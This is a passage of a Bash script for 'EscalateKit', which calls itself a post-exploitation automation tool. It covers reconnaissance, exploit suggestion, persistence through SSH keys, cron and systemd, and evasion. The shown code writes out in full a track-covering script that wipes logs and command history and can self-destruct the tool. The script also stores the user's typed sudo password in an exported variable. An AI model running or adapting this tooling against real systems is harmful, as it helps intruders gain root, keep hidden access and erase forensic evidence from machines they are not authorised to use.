    echo "    echo \"[-] Not running with root privileges, skipping system log cleanup\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Clean up current script artifacts
    echo "# Clean up EscalateKit artifacts" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Cleaning up EscalateKit artifacts...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "rm -rf \"\$TARGET_DIR/.escalatekit_results\" 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "rm -rf \"\$TARGET_DIR/.escalatekit_logs\" 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Self-destruct option
    echo "# Self-destruct option" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo -n \"[?] Do you want to remove the EscalateKit tool completely? (y/n): \"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "read -r response" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "if [[ \"\$response\" =~ ^[Yy]$ ]]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[*] Self-destructing EscalateKit...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Get the parent directory of the current script" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    SCRIPT_DIR=\$(dirname \"\$(readlink -f \"\$0\")\")" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    PARENT_DIR=\$(dirname \"\$SCRIPT_DIR\")" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Remove all EscalateKit files" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    rm -rf \"\$PARENT_DIR\" 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[+] EscalateKit removed\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[+] This script will self-destruct in 3 seconds...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    sleep 3" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    rm -f \"\$0\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    exit 0" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[+] Track covering complete\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    chmod +x "$OUTPUT_DIR/evade/cover_tracks.sh"

    echo "[+] Track covering script created: $OUTPUT_DIR/evade/cover_tracks.sh" >>"$output_file"
    echo "    - Usage: ./cover_tracks.sh [DIRECTORY]" >>"$output_file"
    echo "    - This script will clean up logs, temporary files, and command history" >>"$output_file"
    echo "    - Root privileges are required for cleaning system logs" >>"$output_file"
    echo "    - Includes a self-destruct option to remove all traces of EscalateKit" >>"$output_file"

    log_message "INFOS" "Track covering setup complete"
    return 0
}

# ----------------------------------------------------------------------
# Main Execution Functions
# ----------------------------------------------------------------------

# Update the run_functions_parallel function for better thread support
# Update the run_functions_parallel function for proper parallel execution
run_functions_parallel() {
    local mode="$1"
    shift
    local functions=("$@")
    
    case "$mode" in
        "fork")
            local pids=()
            for func in "${functions[@]}"; do
                $func &
                pids+=($!)
                if [ "$QUIET_MODE" = false ]; then
                    echo "[*] Started $func in background (PID: $!)"
                fi
            done
            # Wait for all functions to complete
            for pid in "${pids[@]}"; do
                wait $pid
            done
            ;;
        "thread")
            if command -v parallel >/dev/null 2>&1; then
                # Export all necessary functions and variables for GNU Parallel
                export -f $(declare -F | awk '{print $3}' | grep -E '^(recon_|persist_|exploit_|evade_|log_message|show_loading|check_gtfobins|init_gtfobins)' || true)
                export LOG_DIR LOGFILE OUTPUT_DIR VERBOSE QUIET_MODE GTFOBINS_DATA
                export RECON_PASSWORD_AVAILABLE RECON_USER_PASSWORD
                
                # Run functions in parallel with proper job control
                printf '%s\n' "${functions[@]}" | parallel --will-cite -j0 --joblog /tmp/parallel.log 'eval {}'
            else
                log_message "WARN" "GNU Parallel not found, falling back to fork mode"
                run_functions_parallel "fork" "${functions[@]}"
            fi
            ;;
        "subshell")
            # Fixed: Run subshells in parallel, not sequentially
            local pids=()
            for func in "${functions[@]}"; do
                if [ "$QUIET_MODE" = false ]; then
                    echo "[*] Running $func in subshell..."
                fi
                ( $func ) &
                pids+=($!)
            done
            # Wait for all subshells to complete
            for pid in "${pids[@]}"; do
                wait $pid
            done
            ;;
        *)
            # Sequential execution
            for func in "${functions[@]}"; do
                $func
            done
            ;;
    esac
}

# SIMPLIFIED run_module function
run_module() {
    local module="$1"

    case "$module" in
    "shell")
        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Running Shell Enhancement module..."
        fi
        shell_upgrade
        ;;
    "recon")
        # Ask user about password knowledge before starting recon
        if [ -z "$RECON_PASSWORD_AVAILABLE" ]; then
            # This means we haven't set the password choice yet
            if [ "$QUIET_MODE" = false ] && [ "$PARALLEL_MODE" = "" ]; then
                # Only show interactive prompt in sequential mode
                echo -e "\n\e[33m[!] RECONNAISSANCE MODULE PREPARATION\e[0m"
                echo "====================================="
                echo ""
                echo "The reconnaissance module will perform comprehensive system analysis including:"
                echo "• System information gathering"
                echo "• Network configuration analysis"
                echo "• Sudo privileges enumeration"
                echo "• SUID binary detection"
                echo "• File capabilities check"
                echo "• Cron job analysis"
                echo "• Writable files search"
                echo "• Kernel vulnerability assessment"
                echo ""
                echo -e "\e[33m[?] IMPORTANT QUESTION:\e[0m"
                echo "Do you know the current user's password for sudo enumeration?"
                echo ""
                echo "Options:"
                echo "  y/yes - I know the password and will enter it when prompted"
                echo "  n/no  - I don't know the password, skip password-protected checks"
                echo "  a/auto - Try automatic detection without password prompts"
                echo ""

                while true; do
                    read -p "Enter your choice [y/n/a]: " password_choice
                    case "$password_choice" in
                    [Yy] | [Yy][Ee][Ss])
                        export RECON_PASSWORD_AVAILABLE="yes"
                        echo ""
                        echo -e "\e[32m[+] Password will be requested during sudo enumeration\e[0m"
                        echo -e "\e[33m[!] Be ready to enter the password when prompted\e[0m"

                        # Prompt for password now and store it
                        echo ""
                        echo -e "\e[33m[*] Please enter the current user's password:\e[0m"
                        read -s -p "Password: " user_password
                        export RECON_USER_PASSWORD="$user_password"
                        echo ""
                        echo -e "\e[32m[+] Password stored for sudo enumeration\e[0m"
                        break
                        ;;
                    [Nn] | [Nn][Oo])
                        export RECON_PASSWORD_AVAILABLE="no"
                        export RECON_USER_PASSWORD=""
                        echo ""
                        echo -e "\e[33m[!] Password-protected sudo checks will be skipped\e[0m"
                        echo -e "\e[32m[+] Only passwordless sudo access will be checked\e[0m"
                        break
                        ;;
                    [Aa] | [Aa][Uu][Tt][Oo])
                        export RECON_PASSWORD_AVAILABLE="auto"
                        export RECON_USER_PASSWORD=""
                        echo ""
                        echo -e "\e[32m[+] Automatic detection enabled\e[0m"
                        echo -e "\e[33m[!] Will try cached credentials and passwordless access only\e[0m"
                        break
                        ;;
                    *)
                        echo -e "\e[31m[-] Invalid choice. Please enter 'y', 'n', or 'a'\e[0m"
                        ;;
                    esac
                done

                echo ""
                echo -e "\e[33m[!] NOTICE:\e[0m Reconnaissance may take several minutes. Please be patient..."
                echo ""

                # Give user a moment to prepare
                echo "Starting reconnaissance in 3 seconds..."
                sleep 1
                echo "2..."
                sleep 1
                echo "1..."
                sleep 1
                echo ""
            else
                # In async mode or quiet mode, default to auto detection
                export RECON_PASSWORD_AVAILABLE="auto"
                export RECON_USER_PASSWORD=""
            fi
        fi

        # Define recon functions to run
        recon_functions=(
            "recon_system_info"
            "recon_network"
            "recon_sudo_privileges"
            "recon_suid_files"
            "recon_capabilities"
            "recon_cron_jobs"
            "recon_writable_files"
            "recon_kernel_exploits"
        )

        # Run recon functions based on parallel mode
        if [ -n "$PARALLEL_MODE" ]; then
            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Running reconnaissance functions in $PARALLEL_MODE mode..."
            fi
            run_functions_parallel "$PARALLEL_MODE" "${recon_functions[@]}"
        else

            # Sequential execution with proper loading
            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Gathering system information..."
            fi
            recon_system_info &
            show_loading $! "Gathering system information"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Analyzing network configuration..."
            fi
            recon_network &
            show_loading $! "Analyzing network configuration"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Checking sudo privileges..."
            fi
            recon_sudo_privileges &
            show_loading $! "Checking sudo privileges"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Searching for SUID files (this may take a while)..."
            fi
            recon_suid_files &
            show_loading $! "Searching for SUID files"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Checking capabilities..."
            fi
            recon_capabilities &
            show_loading $! "Checking capabilities"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Analyzing cron jobs..."
            fi
            recon_cron_jobs &
            show_loading $! "Analyzing cron jobs"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Searching for writable files (this may take a while)..."
            fi
            recon_writable_files &
            show_loading $! "Searching for writable files"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Checking for kernel exploits..."
            fi
            recon_kernel_exploits &
            show_loading $! "Checking for kernel exploits"
            wait $!

            # Clear the stored password for security
            unset RECON_USER_PASSWORD

        fi
        ;;
    "exploit")

        exploit_functions=(
            "exploit_suggest"
            "exploit_generate_templates"
        )

        if [ -n "$PARALLEL_MODE" ]; then
            run_functions_parallel "$PARALLEL_MODE" "${exploit_functions[@]}"
        else

            if [ "$QUIET_MODE" = false ]; then
                echo -e "\n[*] Analyzing exploitation paths..."
            fi
            exploit_suggest &
            show_loading $! "Analyzing exploitation paths"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Generating exploit templates..."
            fi
            exploit_generate_templates &
            show_loading $! "Generating exploit templates"
            wait $!

        fi
        ;;
    "persist")

        persist_functions=(
            "persist_ssh_key"
            "persist_cron_job"
            "persist_systemd_service"
            "persist_startup_file"
        )

        if [ -n "$PARALLEL_MODE" ]; then
            run_functions_parallel "$PARALLEL_MODE" "${persist_functions[@]}"
        else
            if [ "$QUIET_MODE" = false ]; then
                echo -e "\n[*] Setting up SSH key persistence..."
            fi
            persist_ssh_key &
            show_loading $! "Setting up SSH key persistence"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Setting up cron job persistence..."
            fi
            persist_cron_job &
            show_loading $! "Setting up cron job persistence"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Setting up systemd service persistence..."
            fi
            persist_systemd_service &
            show_loading $! "Setting up systemd service persistence"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Setting up startup file persistence..."
            fi
            persist_startup_file &
            show_loading $! "Setting up startup file persistence"
            wait $!
        fi
        ;;

    "evade")
        evade_functions=(
            "evade_cleanup_logs"
            "evade_timestomp"
            "evade_cover_tracks"
        )

        if [ -n "$PARALLEL_MODE" ]; then
            run_functions_parallel "$PARALLEL_MODE" "${evade_functions[@]}"
        else
            if [ "$QUIET_MODE" = false ]; then
                echo -e "\n[*] Setting up log cleanup capabilities..."
            fi
            evade_cleanup_logs &
            show_loading $! "Setting up log cleanup capabilities"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Setting up timestomping capabilities..."
            fi
            evade_timestomp &
            show_loading $! "Setting up timestomping capabilities"
            wait $!

            if [ "$QUIET_MODE" = false ]; then
                echo "[*] Setting up track covering capabilities..."
            fi
            evade_cover_tracks &
            show_loading $! "Setting up track covering capabilities"
            wait $!
        fi
        ;;
    *)
        log_message "ERROR" "Unknown module: $module"
        return 1
        ;;
    esac

    return 0
}

# Run modules using fork
run_with_fork() {
    local modules=("$@")

    log_message "INFOS" "Running modules using fork"

    for module in "${modules[@]}"; do
        run_module "$module" &
        pid=$!
        pids+=($pid)
        log_message "INFOS" "Started module $module with PID $pid"
    done

    # Wait for all child processes to complete
    for pid in "${pids[@]}"; do
        wait $pid
        log_message "INFOS" "Completed module with PID $pid"
    done

    log_message "INFOS" "All modules completed using fork"
}

# Run modules using threads

run_with_thread() {
    local modules=("$@")

    log_message "INFOS" "Running modules using threads"

    if command -v parallel >/dev/null 2>&1; then
        # Export all necessary functions and variables more comprehensively
        export -f $(declare -F | awk '{print $3}')
        
        # Export all variables
        export LOG_DIR LOGFILE OUTPUT_DIR VERBOSE QUIET_MODE GTFOBINS_DATA
        export RECON_PASSWORD_AVAILABLE RECON_USER_PASSWORD
        export DEFAULT_OUTPUT_DIR PROGRAM_NAME VERSION
        
        # Run modules in parallel with better job control
        printf '%s\n' "${modules[@]}" | parallel --will-cite -j0 --delay 0.1 run_module
    else
        log_message "WARN" "GNU Parallel not found, falling back to fork mode"
        run_with_fork "${modules[@]}"
    fi

    log_message "INFOS" "All modules completed using threads"
}
# Run modules using subshell
run_with_subshell() {
    local modules=("$@")

    log_message "INFOS" "Running modules using subshell"

    # Fixed: Run modules in parallel subshells, not sequential
    local pids=()
    for module in "${modules[@]}"; do
        (
            log_message "INFOS" "Starting module $module in subshell"
            run_module "$module"
            log_message "INFOS" "Completed module $module in subshell"
        ) &
        pids+=($!)
    done
    
    # Wait for all subshells to complete
    for pid in "${pids[@]}"; do
        wait $pid
    done

    log_message "INFOS" "All modules completed using subshell"
}

# Export results
export_results() {
    local format="$1"

    log_message "INFOS" "Exporting results in format: $format"

    # Create export directory
    mkdir -p "$OUTPUT_DIR/export"

    case "$format" in
    "json")
        export_json
        ;;
    "html")
        export_html
        ;;
    "csv")
        export_csv
        ;;
    *)
        log_message "ERROR" "Unsupported export format: $format"
        return 1
        ;;
    esac

    return 0
}

# Export results in JSON format
export_json() {
    local output_file="$OUTPUT_DIR/export/results.json"

    log_message "INFOS" "Exporting results to JSON: $output_file"

    # Create a simple JSON structure
    echo "{" >"$output_file"
    echo "  \"generated\": \"$(date)\"," >>"$output_file"
    echo "  \"user\": \"$(whoami)\"," >>"$output_file"
    echo "  \"hostname\": \"$(hostname)\"," >>"$output_file"

    # Export modules data
    echo "  \"modules\": {" >>"$output_file"

    # Shell module
    if [ -d "$OUTPUT_DIR/shell" ]; then
        echo "    \"shell\": {" >>"$output_file"
        echo "      \"upgrade_options\": $(cat "$OUTPUT_DIR/shell/upgrade_options.txt" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')" >>"$output_file"
        echo "    }," >>"$output_file"
    fi

    # Recon module
    if [ -d "$OUTPUT_DIR/recon" ]; then
        echo "    \"recon\": {" >>"$output_file"
        for file in "$OUTPUT_DIR/recon/"*.txt; do
            filename=$(basename "$file" .txt)
            echo "      \"$filename\": $(cat "$file" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')," >>"$output_file"
        done
        # Remove trailing comma from last item
        sed -i '$ s/,$//' "$output_file"
        echo "    }," >>"$output_file"
    fi

    # Exploit module
    if [ -d "$OUTPUT_DIR/exploit" ]; then
        echo "    \"exploit\": {" >>"$output_file"
        if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
            echo "      \"suggestions\": $(cat "$OUTPUT_DIR/exploit/suggestions.txt" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')" >>"$output_file"
        fi
        echo "    }," >>"$output_file"
    fi

    # Persist module
    if [ -d "$OUTPUT_DIR/persist" ]; then
        echo "    \"persist\": {" >>"$output_file"
        for file in "$OUTPUT_DIR/persist/"*.txt; do
            filename=$(basename "$file" .txt)
            echo "      \"$filename\": $(cat "$file" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')," >>"$output_file"
        done
        # Remove trailing comma from last item
        sed -i '$ s/,$//' "$output_file"
        echo "    }," >>"$output_file"
    fi

    # Evade module
    if [ -d "$OUTPUT_DIR/evade" ]; then
        echo "    \"evade\": {" >>"$output_file"
        for file in "$OUTPUT_DIR/evade/"*.txt; do
            filename=$(basename "$file" .txt)
            echo "      \"$filename\": $(cat "$file" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')," >>"$output_file"
        done
        # Remove trailing comma from last item
        sed -i '$ s/,$//' "$output_file"
        echo "    }" >>"$output_file"
    fi

    echo "  }" >>"$output_file"
    echo "}" >>"$output_file"

    log_message "INFOS" "JSON export complete: $output_file"
}

# Export results in HTML format
export_html() {
    local output_file="$OUTPUT_DIR/export/results.html"

    log_message "INFOS" "Exporting results to HTML: $output_file"

    # Create HTML header
    cat >"$output_file" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EscalateKit Results</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }
        h1 { color: #c00; }
        h2 { color: #900; margin-top: 30px; }
        h3 { color: #600; }
        pre { background-color: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .module { background-color: white; padding: 15px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .info { background-color: #dff0d8; padding: 10px; border-radius: 5px; }
        .warning { background-color: #fcf8e3; padding: 10px; border-radius: 5px; }
        .danger { background-color: #f2dede; padding: 10px; border-radius: 5px; }
        .footer { margin-top: 50px; font-size: 12px; color: #666; text-align: center; }
        .highlight { background-color: #ffe0e0; font-weight: bold; }
    </style>
</head>
<body>
    <h1>EscalateKit Results</h1>
    <div class="info">
        <p><strong>Generated:</strong> $(date)</p>
        <p><strong>User:</strong> $(whoami)</p>
        <p><strong>Hostname:</strong> $(hostname)</p>
    </div>
EOF

    # Shell module
    if [ -d "$OUTPUT_DIR/shell" ]; then
        cat >>"$output_file" <<EOF
    <h2>Shell Upgrade</h2>
    <div class="module">
        <h3>Upgrade Options</h3>
        <pre>$(cat "$OUTPUT_DIR/shell/upgrade_options.txt")</pre>
    </div>
EOF
    fi

    # Recon module
    if [ -d "$OUTPUT_DIR/recon" ]; then
        cat >>"$output_file" <<EOF
    <h2>Reconnaissance Results</h2>
EOF

        for file in "$OUTPUT_DIR/recon/"*.txt; do
            filename=$(basename "$file" .txt)
            title=$(echo "$filename" | tr '_' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)} 1')

            # Read file content and highlight vulnerabilities/findings
            content=$(cat "$file" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')

            cat >>"$output_file" <<EOF
    <div class="module">
        <h3>$title</h3>
        <pre>$content</pre>
    </div>
EOF
        done
    fi

    # Exploit module
    if [ -d "$OUTPUT_DIR/exploit" ]; then
        cat >>"$output_file" <<EOF
    <h2>Exploitation Options</h2>
EOF

        if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
            content=$(cat "$OUTPUT_DIR/exploit/suggestions.txt" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')
            cat >>"$output_file" <<EOF
    <div class="module">
        <h3>Suggested Exploits</h3>
        <pre>$content</pre>
    </div>
EOF
        fi

        if [ -d "$OUTPUT_DIR/exploit/templates" ]; then
            cat >>"$output_file" <<EOF
    <div class="module">
        <h3>Exploit Templates</h3>
        <p>The following exploit templates have been generated:</p>
        <ul>
EOF

            for template in "$OUTPUT_DIR/exploit/templates/"*.sh; do
                if [ -f "$template" ]; then
                    template_name=$(basename "$template")
                    template_desc=$(head -n 2 "$template" | grep -o "# Exploit for.*")
                    cat >>"$output_file" <<EOF
            <li>$template_name - $template_desc</li>
EOF
                fi
            done

            cat >>"$output_file" <<EOF
        </ul>
        <p>These templates can be found in the <code>$OUTPUT_DIR/exploit/templates/</code> directory.</p>
    </div>
EOF
        fi
    fi

    # Persist module
    if [ -d "$OUTPUT_DIR/persist" ]; then
        cat >>"$output_file" <<EOF
    <h2>Persistence Methods</h2>
EOF

        for file in "$OUTPUT_DIR/persist/"*.txt; do
            if [ -f "$file" ]; then
                filename=$(basename "$file" .txt)
                title=$(echo "$filename" | tr '_' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)} 1')
                content=$(cat "$file" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')

                cat >>"$output_file" <<EOF
    <div class="module">
        <h3>$title</h3>
        <pre>$content</pre>
    </div>
EOF
            fi
        done
    fi

    # Evade module
    if [ -d "$OUTPUT_DIR/evade" ]; then
        cat >>"$output_file" <<EOF
    <h2>Evasion Techniques</h2>
EOF

        for file in "$OUTPUT_DIR/evade/"*.txt; do
            if [ -f "$file" ]; then
                filename=$(basename "$file" .txt)
                title=$(echo "$filename" | tr '_' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)} 1')
                content=$(cat "$file" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')

                cat >>"$output_file" <<EOF
    <div class="module">
        <h3>$title</h3>
        <pre>$content</pre>
    </div>
EOF
            fi
        done
    fi

    # Add a summary section
    if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
        cat >>"$output_file" <<EOF
    <h2>Summary</h2>
    <div class="module danger">
        <h3>Privilege Escalation Vectors</h3>
        <ul>
EOF

        grep -E "\[+\]|([0-9]+\. .*escalation)" "$OUTPUT_DIR/exploit/suggestions.txt" | while read -r line; do
            # Highlight the line
            formatted_line=$(echo "$line" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')
            cat >>"$output_file" <<EOF
            <li>$formatted_line</li>
EOF
        done

        cat >>"$output_file" <<EOF
        </ul>
    </div>
EOF
    fi

    # HTML footer
    cat >>"$output_file" <<EOF
    <div class="footer">
        <p>Generated by EscalateKit - v1.0</p>
        <p>Date: $(date)</p>
    </div>
</body>
</html>
EOF

    log_message "INFOS" "HTML export complete: $output_file"
}

# Export results in CSV format
export_csv() {
    local output_file="$OUTPUT_DIR/export/results.csv"

    log_message "INFOS" "Exporting results to CSV: $output_file"

    # Create CSV header
    echo "Module,Category,Finding,Description" >"$output_file"

    # Shell module
    if [ -d "$OUTPUT_DIR/shell" ]; then
        while IFS= read -r line; do
            if [[ "$line" == *"[+"* ]]; then
                # This is a finding
                echo "Shell,Upgrade,\"$line\",\"Available shell upgrade method\"" >>"$output_file"
            fi
        done <"$OUTPUT_DIR/shell/upgrade_options.txt"
    fi

    # Recon module
    if [ -d "$OUTPUT_DIR/recon" ]; then
        for file in "$OUTPUT_DIR/recon/"*.txt; do
            category=$(basename "$file" .txt | tr '_' ' ')

            while IFS= read -r line; do
                if [[ "$line" == *"[+"* ]]; then
                    # Extract just the finding part from the line
                    finding=$(echo "$line" | sed 's/\[+\]//')
                    description="Potential security issue"

                    # Customize description based on category
                    case "$category" in
                    "sudo_privs")
                        description="Potentially exploitable sudo permission"
                        ;;
                    "suid_files")
                        description="SUID binary that could be exploited"
                        ;;
                    "capabilities")
                        description="Dangerous capability set"
                        ;;
                    "cron_jobs")
                        description="Writable cron job that could be modified"
                        ;;
                    "writable_files")
                        description="Critical writable file or directory"
                        ;;
                    "kernel_exploits")
                        description="Potential kernel vulnerability"
                        ;;
                    esac

                    echo "Recon,$category,\"$finding\",\"$description\"" >>"$output_file"
                fi
            done <"$file"
        done
    fi

    # Exploit module
    if [ -d "$OUTPUT_DIR/exploit" ]; then
        if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
            while IFS= read -r line; do
                if [[ "$line" == *"[+"* ]]; then
                    echo "Exploit,Suggestion,\"$line\",\"Potential exploit vector\"" >>"$output_file"
                elif [[ "$line" =~ ^[0-9]+\. ]]; then
                    # This is a priority item
                    echo "Exploit,Priority,\"$line\",\"Exploit priority\"" >>"$output_file"
                fi
            done <"$OUTPUT_DIR/exploit/suggestions.txt"
        fi

        # Add exploit templates
        if [ -d "$OUTPUT_DIR/exploit/templates" ]; then
            for template in "$OUTPUT_DIR/exploit/templates/"*.sh; do
                if [ -f "$template" ]; then
                    template_name=$(basename "$template")
                    template_desc=$(head -n 2 "$template" | grep -o "# Exploit for.*")
                    echo "Exploit,Template,\"$template_name\",\"$template_desc\"" >>"$output_file"
                fi
            done
        fi
    fi

    # Persist module
    if [ -d "$OUTPUT_DIR/persist" ]; then
        for file in "$OUTPUT_DIR/persist/"*.txt; do
            if [ -f "$file" ]; then
                category=$(basename "$file" .txt | tr '_' ' ')

                while IFS= read -r line; do
                    if [[ "$line" == *"[+"* ]]; then
                        echo "Persist,$category,\"$line\",\"Persistence mechanism\"" >>"$output_file"
                    fi
                done <"$file"
            fi
        done
    fi

    # Evade module
    if [ -d "$OUTPUT_DIR/evade" ]; then
        for file in "$OUTPUT_DIR/evade/"*.txt; do
            if [ -f "$file" ]; then
                category=$(basename "$file" .txt | tr '_' ' ')

                while IFS= read -r line; do
                    if [[ "$line" == *"[+"* ]]; then
                        echo "Evade,$category,\"$line\",\"Evasion technique\"" >>"$output_file"
                    fi
                done <"$file"
            fi
        done
    fi

    log_message "INFOS" "CSV export complete: $output_file"
    echo "[+] You can open this CSV file in any spreadsheet application for further analysis"
}

# Restore default configuration
restore_defaults() {
    log_message "INFOS" "Restoring default configuration"

    # Reset output and log directories
    OUTPUT_DIR="$DEFAULT_OUTPUT_DIR"
    LOG_DIR="/tmp/.escalatekit_logs"
    LOGFILE="$LOG_DIR/history.log"

    # Clean up any artifacts
    rm -rf "$OUTPUT_DIR" 2>/dev/null
    rm -rf "$LOG_DIR" 2>/dev/null

    # Create default directories
    mkdir -p "$OUTPUT_DIR" 2>/dev/null
    mkdir -p "$LOG_DIR" 2>/dev/null

    log_message "INFOS" "Default configuration restored"
}

# ----------------------------------------------------------------------
# Main Script Execution
# ----------------------------------------------------------------------

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
    -h | --help)
        display_help
        exit $E_SUCCESS
        ;;
    -f | --fork)
        PARALLEL_MODE="fork"
        shift
        ;;
    -t | --thread)
        PARALLEL_MODE="thread"
        shift
        ;;
    -s | --subshell)
        PARALLEL_MODE="subshell"
        shift
        ;;
    -l | --log)
        if [[ -z "$2" || "$2" == -* ]]; then
            log_message "ERROR" "Option -l requires a directory parameter"
            exit $E_MISSING_PARAM
        fi
        LOG_DIR="$2"
        LOGFILE="$LOG_DIR/history.log"
        shift 2
        ;;
    -r | --restore)
        restore_defaults
        exit $E_SUCCESS
        ;;
    -v | --verbose)
        VERBOSE=true
        shift
        ;;
    -m | --modules)
        if [[ -z "$2" || "$2" == -* ]]; then
            log_message "ERROR" "Option -m requires a module list parameter"
            exit $E_MISSING_PARAM
        fi
        MODULES_TO_RUN="$2"
        shift 2
        ;;
    -o | --output)
        if [[ -z "$2" || "$2" == -* ]]; then
            log_message "ERROR" "Option -o requires a format parameter"
            exit $E_MISSING_PARAM
        fi
        EXPORT_FORMAT="$2"
        shift 2
        ;;
    -q | --quiet)
        QUIET_MODE=true
        shift
        ;;
    -*)
        log_message "ERROR" "Unknown option: $1"
        display_help
        exit $E_OPTION_NOT_EXIST
        ;;
    *)
        # Assume the first non-option argument is the target directory
        TARGET_DIR="$1"
        shift
        ;;
    esac
done

# Display banner if not in quiet mode
if [ "$QUIET_MODE" = false ]; then
    echo -e "\e[1;31m"
    echo "███████╗███████╗ ██████╗ █████╗ ██╗      █████╗ ████████╗███████╗██╗  ██╗██╗████████╗"
    echo "██╔════╝██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗╚══██╔══╝██╔════╝██║ ██╔╝██║╚══██╔══╝"
    echo "█████╗  ███████╗██║     ███████║██║     ███████║   ██║   █████╗  █████╔╝ ██║   ██║   "
    echo "██╔══╝  ╚════██║██║     ██╔══██║██║     ██╔══██║   ██║   ██╔══╝  ██╔═██╗ ██║   ██║   "
    echo "███████╗███████║╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██║  ██╗██║   ██║   "
    echo "╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   "
    echo -e "\e[0m"
    echo -e "\e[1;32mPost-Exploitation Automation Tool v$VERSION\e[0m"
    echo -e "\e[1;34mAuthor: K4YR0\e[0m"

    # Show current user status instead of root status
    current_user=$(whoami)
    current_uid=$(id -u)

    if [ "$current_uid" -eq 0 ]; then
        echo -e "\e[1;33m[!] Currently running as ROOT - privilege escalation not needed\e[0m"
    else
        echo -e "\e[1;32m[+] Running as user: $current_user (UID: $current_uid) - ready for privilege escalation\e[0m"
    fi

    echo -e "\e[0m"
    echo "========================================================================"
    echo ""
fi

# Check current privileges (this will respect the QUIET_MODE setting)
check_current_privileges

# Create output directory if it doesn't exist
mkdir -p "$OUTPUT_DIR" 2>/dev/null
if [ $? -ne 0 ]; then
    log_message "ERROR" "Cannot create output directory: $OUTPUT_DIR"
    exit $E_PERMISSION_DENIED
fi

# Create log directory if it doesn't exist
mkdir -p "$LOG_DIR" 2>/dev/null
if [ $? -ne 0 ]; then
    log_message "ERROR" "Cannot create log directory: $LOG_DIR"
    exit $E_PERMISSION_DENIED
fi

# Parse modules to run
